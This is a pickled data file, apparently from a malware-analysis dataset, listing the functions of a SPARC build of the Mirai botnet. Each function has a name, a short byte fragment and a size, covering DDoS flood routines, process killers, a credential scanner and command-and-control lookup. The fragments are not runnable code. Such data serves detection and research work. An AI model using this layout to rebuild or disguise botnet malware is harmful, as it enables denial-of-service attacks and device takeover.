(lp0
(S'_init'
p1
S'9de39840002800003500'
p2
L28L
tp3
a(S'__do_global_dtors_aux'
p4
S'9de3982300801900b8c44000800300'
p5
L124L
tp6
a(S'call___do_global_dtors_aux'
p7
S'9de3988100'
p8
L12L
tp9
a(S'frame_dummy'
p10
S'9de3980300'
p11
L96L
tp12
a(S'call_frame_dummy'
p13
S'9de3988100'
p14
L12L
tp15
a(S'_start'
p16
S'bc23589403581700401900129c9612949813c801320000000001a8013801'
p17
L76L
tp18
a(S'attack_app_http'
p19
S'03'
p20
L7096L
tp21
a(S'attack_get_opt_str'
p22
S'900aff80940a0402800880d6029210028084a001bfa008028100'
p23
L96L
tp24
a(S'attack_get_opt_ip'
p25
S'9de3989610001019ffb000800400008091e8e0'
p26
L56L
tp27
a(S'attack_get_opt_int'
p28
S'9de3989610001019ffb0008005b00010208100'
p29
L60L
tp30
a(S'attack_start'
p31
S'9de39840006200008080040000e81e590100800a8003009010181ee500001f0c1009299010000880fc01000300da60d803c204a640018088208820800100830200c4e080f98820c200101b4000'
p32
L216L
tp33
a(S'attack_parse'
p34
S'9de3988004a6600480ea08a66005ee0e204e200220a4067fa90580bf004000fc921018100800a006008600b060068820c4003000200420100c04040580f886e0'
p35
L536L
tp36
a(S'attack_kill_all'
p37
S'9de39803001020a0a4000200d000bf004000579210092400a40032001000'
p38
L88L
tp39
a(S'add_attack'
p40
S'9de39892100800b940007010012a04100822000cd404d800bec2d400c4d408d0d82201'
p41
L92L
tp42
a(S'attack_init'
p43
S'9de39890100000517fff921290100100527fff921290100200537f'
p44
L176L
tp45
a(S'attack_gre_eth'
p46
S'9de3409210040e204000901018bf02101a'
p47
L1552L
tp48
a(S'attack_gre_ip'
p49
S'9de3509210040e20400018bf02101afd4c92101b003fd0bfff101bfd4594100310041040a2'
p50
L1428L
tp51
a(S'attack_tcp_stomp'
p52
S'9de3280e20400092100427be4190101800d0be02'
p53
L1828L
tp54
a(S'attack_tcp_ack'
p55
S'9de3380e2040007c1018bf02101bfa1e90101a003fd0bfff1003fa1790101a27bf0410407ffa11101b20ae1008fa0b14ff27bf1bfa059614ff27bf1bf9ff14ff27bf1bf9f990101a27bf1bf990101a27bf0b'
p56
L1692L
tp57
a(S'attack_tcp_syn'
p58
S'9de3489210040e204000d51018209610001008f877101a003f92101b1003f870101a27bf0410407ff86a101a1005a8007ff890101a27bf1bf85e90101a27bf1bf85890101a27bf1bf85290101a27bf12'
p59
L1616L
tp60
a(S'attack_udp_plain'
p61
S'9de3880e2040004190101810081f3db4a03f92101be3a8007ff690101a1008e37ff690101a1008227ff690101a1008007ff6100114ff100827bfecc0'
p62
L536L
tp63
a(S'attack_udp_generic'
p64
S'9de37010040e204000bbb4a0dc2092101bf6101a003fd0bfff1003f6101a27bf0410407ff6101a1005baff4a90101a101b007ff61a27bf1bf690101a10001008f690101a10011008f690101a00b992101b61907ff690101a27bf03001180ac1008100027bf030004a20083831007bfb4100207bf1380b8100000830538b6a3d804081000005792100107bf0207bf0221010102100010'
p65
L1124L
tp66
a(S'attack_udp_vse'
p67
S'9de38020400018209610001008f54490101a003f92101b1003ff3d92101b27bf0410407ff53790101a1005aa1008f53114ff27bf1bf52b100792101b001aff2412870090204000d790101da210031c90100280a61008100027bf030080acc2e8800180a4101007bf1827bfff03ff103710000080bf0201da400010'
p68
L968L
tp69
a(S'attack_udp_dns'
p70
S'9de3489210040e204000901018b7941002101bf45290101a003fd0b79614ff1003f44b90101a27b794100410407ff44590101a1005baff3f90101a101b007ff439101b27b794100796103590101a101b007ff42d92101b201008f42790101a2092101bfffb90101a000c101e921000d4005b92100000ffa420068027a000101013a200f1901010'
p71
L1628L
tp72
a(S'checksum_generic'
p73
S'80090092028480a2'
p74
L100L
tp75
a(S'checksum_tcpudp'
p76
S'9de3988800800c06200400b420c2000680a6e014'
p77
L204L
tp78
a(S'mem_exists'
p79
S'801002800c000048c04a0080091000a2'
p80
L96L
tp81
a(S'killer_kill'
p82
S'0300d06198'
p83
L24L
tp84
a(S'killer_kill_by_port'
p85
S'03ff'
p86
L1516L
tp87
a(S'killer_init'
p88
S'03ff'
p89
L1644L
tp90
a(S'anti_gdb_entry'
p91
S'030000b881'
p92
L20L
tp93
a(S'teardown_connection'
p94
S'9de3983100800540001f0100'
p95
L48L
tp96
a(S'ensure_single_instance'
p97
S'9de3802094100027bfb61002003f9607bf0412941004a200d0504000a0e0a3030d10001012010d101fc04ce3801a100237bfee'
p98
L356L
tp99
a(S'main'
p100
S'9de3604000d306400000851010167410020040009490100100832040007f12110010020e0580a0'
p101
L2144L
tp102
a(S'resolve_cnc_addr'
p103
S'9de3984000ae90100300761003000100b0004000a180170100400017e22000300e008520901018040200b940009cc20400969010041000005db020120034028081e0'
p104
L148L
tp105
a(S'rand_next'
p106
S'0500b9c20800b9c4e11b00c210200c1a0218'
p107
L80L
tp108
a(S'rand_str'
p109
S'9de39880170100800ca660018001007fffb27fd00080f7'
p110
L108L
tp111
a(S'rand_alphastr'
p112
S'9de370007607bf200eb1102180a0a660038001007fff010086008820'
p113
L164L
tp114
a(S'rand_init'
p115
S'9de398400090100000b94000d061040044a01c080ce0610800b9051a0320'
p116
L80L
tp117
a(S'resolv_skip_name'
p118
S''
p119
L136L
tp120
a(S'resolv_entries_free'
p121
S'9de3989096200200d020a200000014010010008100'
p122
L56L
tp123
a(S'resolv_domain_to_hostname'
p124
S'9de3984000'
p125
L120L
tp126
a(S'resolv_lookup'
p127
S'9de300039010011018'
p128
L956L
tp129
a(S'consume_any_prompt'
p130
S'8400c218a200'
p131
L144L
tp132
a(S'can_consume'
p133
S'c218020180c3e0904020'
p134
L28L
tp135
a(S'scanner_kill'
p136
S'0300d061b41300800100'
p137
L24L
tp138
a(S'deobf'
p139
S'9de3984000bf860090020112'
p140
L100L
tp141
a(S'add_auth_entry'
p142
S'9de3902300d2140440932a40004f9202a407bf0804141012'
p143
L204L
tp144
a(S'setup_connection'
p145
S'9de388062027bfecc0800427bf530100921001119010021008a0004000b320941000062010030890101000101201089010100620c2e8c21400b9d02000e8c208200048941010'
p146
L196L
tp147
a(S'recv_strip_null'
p148
S'9de398901018004000'
p149
L80L
tp150
a(S'scanner_init'
p151
S'9de36801000300040020810080fd010040006a000000b9d061904000fd90100010202090108000d0e19a001000288305'
p152
L6008L
tp153
a(S'table_retrieve_val'
p154
S'03008461bc0200c204228100'
p155
L40L
tp156
a(S'toggle_obf'
p157
S'0300900aff2a031204a000001830100200090229020200090329030200090229020200090329031204a0'
p158
L152L
tp159
a(S'table_lock_val'
p160
S'900affbf00'
p161
L16L
tp162
a(S'table_unlock_val'
p163
S'900affbf00'
p164
L16L
tp165
a(S'add_entry'
p166
S'9de398400090101a10080100b0200300'
p167
L64L
tp168
a(S'table_init'
p169
S'9de39890100300'
p170
L1004L
tp171
a(S'util_strlen'
p172
S'8400c200809010004a0080'
p173
L48L
tp174
a(S'util_strncmp'
p175
S'9de3987fff901018'
p176
L108L
tp177
a(S'util_strcmp'
p178
S'9de3987f'
p179
L88L
tp180
a(S'util_memcpy'
p181
S'8008802801bf80c3e00100'
p182
L44L
tp183
a(S'util_strcpy'
p184
S'9de3987fff9210191018'
p185
L44L
tp186
a(S'util_zero'
p187
S'8007'
p188
L40L
tp189
a(S'util_itoa'
p190
S'9de370a6a008a62012600aa000e800c0f7100007bf19019010181008101804ff0084603001b020120080841007bf1a'
p191
L240L
tp192
a(S'util_memsearch'
p193
S'8004100810ffbf2010208620900201bf00c40a4a00a0'
p194
L100L
tp195
a(S'util_stristr'
p196
S'9de3987fff101a1000800100c400'
p197
L152L
tp198
a(S'util_atoi'
p199
S'9de398c20038a33c18bf2080f70e008318808048e00003'
p200
L388L
tp201
a(S'util_fdgets'
p202
S'9de398a0101810181001010620800b0401808000bf008000'
p203
L100L
tp204
a(S'util_local_addr'
p205
S'9de3800227bf0200a2100209b020941010a200921011020237bf0827bf99c2e6101000a807bf79101007bf'
p206
L132L
tp207
a(S'fork'
p208
g119
L52L
tp209
a(S'.urem'
p210
S'81000100947209e09022'
p211
L32L
tp212
a(S'.udiv'
p213
S'81008100'
p214
L20L
tp215
a(S'.umul'
p216
S'9052008100'
p217
L12L
tp218
a(S'.rem'
p219
S'953a1f8100010094fa0080943a0922'
p220
L44L
tp221
a(S'fcntl'
p222
S'9de390'
p223
L136L
tp224
a(S'fcntl64'
p225
S'9de390'
p226
L100L
tp227
a(S'chdir'
p228
S'9de398'
p229
L68L
tp230
a(S'close'
p231
S'9de398'
p232
L68L
tp233
a(S'getpid'
p234
S'9de398'
p235
L64L
tp236
a(S'getppid'
p237
S'9de398'
p238
L64L
tp239
a(S'ioctl'
p240
S'9de390'
p241
L100L
tp242
a(S'kill'
p243
S'9de398'
p244
L72L
tp245
a(S'open'
p246
S'9de39094100027a054fa27a0198e02a05094101a27bf10321080ba2008a000b000b03fff2200'
p247
L120L
tp248
a(S'creat'
p249
S'9410091300bf00'
p250
L20L
tp251
a(S'prctl'
p252
S'9de398'
p253
L84L
tp254
a(S'read'
p255
S'9de398'
p256
L76L
tp257
a(S'readlink'
p258
S'9de398'
p259
L76L
tp260
a(S'select'
p261
S'9de398'
p262
L84L
tp263
a(S'setsid'
p264
S'9de398'
p265
L64L
tp266
a(S'sigprocmask'
p267
S'9de398901018a660008094101aa00010808096100800b03fff2200e820100880b400b400'
p268
L140L
tp269
a(S'time'
p270
S'9de398'
p271
L72L
tp272
a(S'unlink'
p273
S'9de398'
p274
L68L
tp275
a(S'write'
p276
S'9de398'
p277
L76L
tp278
a(S'closedir'
p279
S'9de388007207bf18060092129010118094101000'
p280
L136L
tp281
a(S'opendir'
p282
S'9de34013001018'
p283
L260L
tp284
a(S'readdir'
p285
S'9de3880620130010100a1240003006200620800ec60c0600d220002d8004201020c00406200620000820040420c203bf2007bf010ab0008100'
p286
L168L
tp287
a(S'__errno_location'
p288
S'11009012'
p289
L12L
tp290
a(S'clock'
p291
S'9de3880b9007bfecc4bfff230300'
p292
L56L
tp293
a(S'bcopy'
p294
S'96100810'
p295
L12L
tp296
a(S'memmove'
p297
S'80400800960280768b03020a8080eb8a12600480'
p298
L1448L
tp299
a(S'memcpy'
p300
S'9822092303808008bf600480'
p301
L4196L
tp302
a(S'sub_1B884'
p303
S'81'
p304
L8L
tp305
a(S'sub_1B88C'
p306
S'81'
p307
L8L
tp308
a(S'bzero'
p309
S'1000'
p310
L8L
tp311
a(S'memset'
p312
S'8660ff10021002a2001008'
p313
L192L
tp314
a(S'sub_1B988'
p315
S'81'
p316
L8L
tp317
a(S'inet_addr'
p318
S'9de390901018002ba200'
p319
L40L
tp320
a(S'accept'
p321
S'9de398'
p322
L76L
tp323
a(S'bind'
p324
S'9de38827bf'
p325
L36L
tp326
a(S'connect'
p327
S'9de398'
p328
L76L
tp329
a(S'getsockname'
p330
S'9de398'
p331
L76L
tp332
a(S'getsockopt'
p333
S'9de398'
p334
L84L
tp335
a(S'listen'
p336
S'9de3909010043fbf459207bf'
p337
L28L
tp338
a(S'recv'
p339
S'9de3883fbf'
p340
L32L
tp341
a(S'recvfrom'
p342
S'9de398'
p343
L88L
tp344
a(S'send'
p345
S'9de3883fbf'
p346
L32L
tp347
a(S'sendto'
p348
S'9de398'
p349
L88L
tp350
a(S'setsockopt'
p351
S'9de380bfe8f6bff44000'
p352
L44L
tp353
a(S'socket'
p354
S'9de398'
p355
L76L
tp356
a(S'raise'
p357
S'9de3987ff71018bf00'
p358
L20L
tp359
a(S'sigaddset'
p360
S'9de398'
p361
L56L
tp362
a(S'sigemptyset'
p363
S'9de3989210001080be8100'
p364
L32L
tp365
a(S'signal'
p366
S'9de380008004a6208027bfecb03fff2200e82010bf032084'
p367
L188L
tp368
a(S'__sigismember'
p369
S'9202'
p370
L40L
tp371
a(S'__sigaddset'
p372
S'86009202842090100032932ac209c3e0c2'
p373
L44L
tp374
a(S'__sigdelset'
p375
S'86009202842090100032932ac209e0c4'
p376
L44L
tp377
a(S'malloc'
p378
S'9de3908004a63ff810201800'
p379
L320L
tp380
a(S'calloc'
p381
S'9de398a0a620020081000100'
p382
L112L
tp383
a(S'free'
p384
S'9de39880a0063ffc31009016210094101100b8901500c2702880a000b99014dc0490100080c404002916210281a005c208200880c20480c204250090124c90241300b9b0234000ef902212bfe0'
p385
L232L
tp386
a(S'realloc'
p387
S'9de3988006a21018ffb0203020126007b0001000a404fcb07f800304fcb020a600082000b990144c920419009012684000ec90144c80'
p388
L280L
tp389
a(S'__heap_alloc'
p390
S'c20008800200801a0004000180'
p391
L160L
tp392
a(S'__heap_alloc_at'
p393
S'8800940220020000801b000980940a0a80'
p394
L156L
tp395
a(S'__heap_link_free_area'
p396
S'd4600880d62210a00080d2e08100'
p397
L48L
tp398
a(S'__heap_link_free_area_after'
p399
S'80032200220822'
p400
L24L
tp401
a(S'__heap_free'
p402
S'9de398882090101880'
p403
L268L
tp404
a(S'atol'
p405
S'921000c0800100'
p406
L20L
tp407
a(S'strtol'
p408
S'961001800100'
p409
L16L
tp410
a(S'_stdlib_strto_l'
p411
S'9de3980300c698c4'
p412
L428L
tp413
a(S'exit'
p414
S'9de38800b994147812a200a810110000b980059fc01018009c9210010000000000a00000008e010040006b00'
p415
L128L
tp416
a(S'sleep'
p417
S'9de3002012bf0800c07880830227bff4a01014'
p418
L428L
tp419
a(S'__uClibc_fini'
p420
S'9de3980500b8'
p421
L132L
tp422
a(S'__pthread_return_0'
p423
S'8120'
p424
L8L
tp425
a(S'_pthread_cleanup_push_defer'
p426
S'8100'
p427
L8L
tp428
a(S'__check_one_fd'
p429
S'9de398921001dba2009210190078ff7d122080010040009d01008100'
p430
L68L
tp431
a(S'__uClibc_init'
p432
S'9de39805000080'
p433
L104L
tp434
a(S'__uClibc_main'
p435
S'9de32000b9c46168fa20830200b984e0c46cc20080'
p436
L620L
tp437
a(S'__socketcall'
p438
S'9de398'
p439
L72L
tp440
a(S'_exit'
p441
S'9de398'
p442
L64L
tp443
a(S'fstat'
p444
S'9de358'
p445
L104L
tp446
a(S'__getdents'
p447
S'9de3989010180092101980b44018e86008066004400006600c066013600406600b0e6012600af4fb940219fff7166008166008a6401abf6010'
p448
L136L
tp449
a(S'__getdents64'
p450
S'9de398'
p451
L288L
tp452
a(S'getegid'
p453
S'9de398'
p454
L64L
tp455
a(S'geteuid'
p456
S'9de398'
p457
L64L
tp458
a(S'getgid'
p459
S'9de398'
p460
L64L
tp461
a(S'getuid'
p462
S'9de398'
p463
L64L
tp464
a(S'lseek64'
p465
S'9de390'
p466
L112L
tp467
a(S'nanosleep'
p468
S'9de398'
p469
L72L
tp470
a(S'sbrk'
p471
S'9de39821008007a20020a200b03fff80'
p472
L84L
tp473
a(S'times'
p474
S'9de398'
p475
L72L
tp476
a(S'__xstat64_conv'
p477
S'9de398921000'
p478
L140L
tp479
a(S'__xstat_conv'
p480
S'9de398921000'
p481
L156L
tp482
a(S'inet_aton'
p483
S'80008015c3e09010004a00'
p484
L220L
tp485
a(S'sigaction'
p486
S'9de38000c20027bf800106608827bf8427bf18a6a003be78000080b000800b07be048007bee9c2e4a0e88100'
p487
L160L
tp488
a(S'abort'
p489
S'9de38800b990129c842010bf032084'
p490
L316L
tp491
a(S'_dl_aux_init'
p492
S'c42000b903008163'
p493
L28L
tp494
a(S'brk'
p495
S'9de398'
p496
L60L
tp497
a(S'__syscall_rt_sigaction'
p498
S'9de398'
p499
L80L
tp500
a(S'__do_global_ctors_aux'
p501
S'9de3980300c47f8008c0c400bf008100'
p502
L60L
tp503
a(S'call___do_global_ctors_aux'
p504
S'9de3988100'
p505
L12L
tp506
a(S'_fini'
p507
S'9de3987fca0000'
p508
L20L
tp509
a.